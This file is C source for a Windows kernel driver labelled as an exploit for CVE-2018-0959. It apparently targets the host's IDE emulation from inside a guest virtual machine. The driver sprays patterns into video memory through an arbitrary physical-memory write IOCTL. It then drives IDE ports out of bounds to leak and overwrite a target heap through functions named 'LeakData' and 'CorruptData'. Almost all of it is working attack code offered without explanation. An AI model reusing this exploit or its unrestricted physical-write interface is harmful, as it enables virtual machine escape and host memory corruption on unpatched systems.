#include <wdm.h>
#include <ntddk.h>
#include <string.h>

#define NT_DEVICE_NAME      L"\\Device\\CVE-2018-0959"
#define DOS_DEVICE_NAME     L"\\DosDevices\\CVE-2018-0959"
#define DEVICE_TYPE_VRAM 0x8000
#define DEVICE_TYPE_TARGET_HEAP 0x8001
#define FUNCTION_READ 0x0
#define FUNCTION_WRITE 0x1

#define VRAM_WRITE CTL_CODE(DEVICE_TYPE_VRAM, FUNCTION_WRITE, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define TARGET_HEAP_READ CTL_CODE(DEVICE_TYPE_TARGET_HEAP, FUNCTION_READ, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define TARGET_HEAP_WRITE CTL_CODE(DEVICE_TYPE_TARGET_HEAP, FUNCTION_WRITE, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct {
    LARGE_INTEGER physAddr;
    PCHAR buffer;
    SIZE_T len;
}VRAM_DATA;

typedef struct _Info {
	void* buffer;
	int from;
	int to;
}WriteInfo, ReadInfo;

NTSTATUS DispatchRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS CreateCloseHandler(PDEVICE_OBJECT DeviceObject, PIRP Irp);
void UnloadDriver(_In_ PDRIVER_OBJECT DriverObject);
int writePhysical(PHYSICAL_ADDRESS, PVOID, SIZE_T);
void LeakData(ReadInfo);
void CorruptData(WriteInfo);
int JumptoTargetHeap();

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath) {

    NTSTATUS        ntStatus;
    UNICODE_STRING  ntUnicodeString;    // NT Device Name "\Device\SIOCTL"
    UNICODE_STRING  ntWin32NameString;    // Win32 Name "\DosDevices\IoctlTest"
    PDEVICE_OBJECT  deviceObject = NULL;    // ptr to device object

    UNREFERENCED_PARAMETER(RegistryPath);

    RtlInitUnicodeString(&ntUnicodeString, NT_DEVICE_NAME);
    RtlInitUnicodeString(&ntWin32NameString, DOS_DEVICE_NAME);

    ntStatus = IoCreateDevice(
        DriverObject,
        0,
        &ntUnicodeString,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &deviceObject);

    if (!NT_SUCCESS(ntStatus))
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "IoCreateDevice Failed\n");
        IoDeleteDevice(DriverObject->DeviceObject);
        return ntStatus;
    }

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[+] Driver for CVE-2018-0959, IO Port Read/Write\n");
    DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateCloseHandler;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateCloseHandler;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchRoutine;
    DriverObject->DriverUnload = UnloadDriver;

    ntStatus = IoCreateSymbolicLink(&ntWin32NameString, &ntUnicodeString);

    if (!NT_SUCCESS(ntStatus))
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "Create symbolic link Failed\n");
        IoDeleteDevice(DriverObject->DeviceObject);
    }

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[+] IOCTL Codes\n Read/Write Target Heap: 0x%x, 0x%x\n Write VRAM Buffer: 0x%x\n", TARGET_HEAP_READ, TARGET_HEAP_WRITE, VRAM_WRITE);

    return ntStatus;
}



NTSTATUS DispatchRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    PIO_STACK_LOCATION  irpSp;
    NTSTATUS            ntStatus = STATUS_UNSUCCESSFUL;
    VRAM_DATA data;


    UNREFERENCED_PARAMETER(DeviceObject);
    irpSp = IoGetCurrentIrpStackLocation(Irp);

    switch (irpSp->Parameters.DeviceIoControl.IoControlCode) {
    case TARGET_HEAP_READ://LeakData
        LeakData(*(ReadInfo*)Irp->AssociatedIrp.SystemBuffer);
        break;

    case TARGET_HEAP_WRITE:
        CorruptData(*(WriteInfo*)Irp->AssociatedIrp.SystemBuffer);
        break;

    case VRAM_WRITE://Spary Pattern to VRAM Buffer
        data = *(VRAM_DATA*)Irp->AssociatedIrp.SystemBuffer;
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "Write Physical: %p %p %llu\n", data.physAddr.QuadPart, data.buffer, data.len);
        if (writePhysical(data.physAddr, data.buffer, data.len)) {
            ntStatus = STATUS_SUCCESS;
        }
        break;

    default:
        ntStatus = STATUS_INVALID_DEVICE_REQUEST;
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "Unrecognized IOCTL\n");

    }

    Irp->IoStatus.Status = ntStatus;
    IoCompleteRequest(Irp, 0);

    return ntStatus;
}

NTSTATUS CreateCloseHandler(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}

void UnloadDriver(_In_ PDRIVER_OBJECT DriverObject) {
    PDEVICE_OBJECT deviceObject = DriverObject->DeviceObject;
    UNICODE_STRING uniWin32NameString;


    RtlInitUnicodeString(&uniWin32NameString, DOS_DEVICE_NAME);
    IoDeleteSymbolicLink(&uniWin32NameString);

    if (deviceObject != NULL)
    {
        IoDeleteDevice(deviceObject);
    }
}

int writePhysical(PHYSICAL_ADDRESS physAddr, PCHAR data, SIZE_T len) {
    CHAR* BaseAddress;
    //DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "%p %llu %llu\n", physAddr, len, data);
    if (!data) return 0;
    BaseAddress = MmMapIoSpace(physAddr, len, 0);

    if (BaseAddress) {
		memcpy(BaseAddress, data, len);
        MmUnmapIoSpace(BaseAddress,len);

        return 1;
    }
    return 0;
}

int JumptoTargetHeap() {
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[+] Initialize IDE_DRIVE_STATE\n");
    __outbyte(0x1f6, 0xe0);
    __outbyte(0x1f5, 0x2);
    __outbyte(0x1f4, 0xf8);
    __outbyte(0x1f3, 0x10);
    __outbyte(0x1f2, 0x77);
    __outbyte(0x1f7, 0x30);

    for (int i = 0; i < 0x200; i += 4) {
        __outdword(0x1f0, 0x41414141);
    }

    //Increase DriveStateBufferOffset 8MB
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[+] Increase DriveStateBufferOffset\n");
    for (int i = 0; i < 0x800000; i+=0x200) {
		__outbyte(0x1f7, 0x30);
    }
	int iter = 0;
    UCHAR data = 0;
    for (int i = 0; i < 20; i++) {
        data = __inbyte(0x1f0);
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[+] Data Read from 0x1f0: 0x%x\n", data);
        if (data < 'H') {//Increase 1MB
            iter = 0x100000;//1MB
        }
        else if (data < 'O') {//increase 128KB
            iter = 0x20000;
        }
        else if (data < 'V') {//16KB
            iter = 0x4000;
        }
        else {// data == 'V', Jump to TargetHeap
            //iter = 0x600000;// 6MB
            iter = 0x5e3e00;
            break;
        }
        for (int j = 0; j < iter; j += 0x200) {
            __outbyte(0x1f7, 0x30);
        }
    }

    if (data < 'V') {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[!] Increase DriveStateBufferOffset Failed\n");
        return 0;
    }
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[+] Jump to Target Heap\n");

	for (int j = 0; j < iter; j += 0x200) {
		__outbyte(0x1f7, 0x30);
	}
    

    return 1;
}

void LeakData(ReadInfo info) {
    int from = info.from, to = info.to, cursor = from;
    int* buffer = info.buffer;

    while (!JumptoTargetHeap()) DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[+] Retry\n");
	for (int i = 0; i < from; i += 0x200) __outbyte(0x1f7, 0x30);

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[+] Read Data\n");

    while (cursor < to) {
        for (int i = 0; i < 0x200; i += 4) {
            *buffer = __indword(0x1f0);
            buffer++;
        }
        __outbyte(0x1f7, 0x30);
        cursor += 0x200;
    }

    //signature: 6965726F 646E7770
    //__outdword(0x1f0, 0x646E7770);
    //__outdword(0x1f0, 0x6965726F);
    //read end

}

void CorruptData(WriteInfo info) {
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[+] Overwrite Data\n");
    int from = info.from, to = info.to, cursor = from;
    int* buffer = info.buffer;

    while (cursor < to) {
        while (!JumptoTargetHeap());
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[+] Write to Offset %x\n", cursor);
        for (int i = 0; i < cursor; i += 0x200) __outbyte(0x1f7, 0x30);
        for (int i = 0; i < 0x200; i += 4) {
            __outdword(0x1f0, *buffer);
            buffer++;
        }
        cursor += 0x200;
    }
}
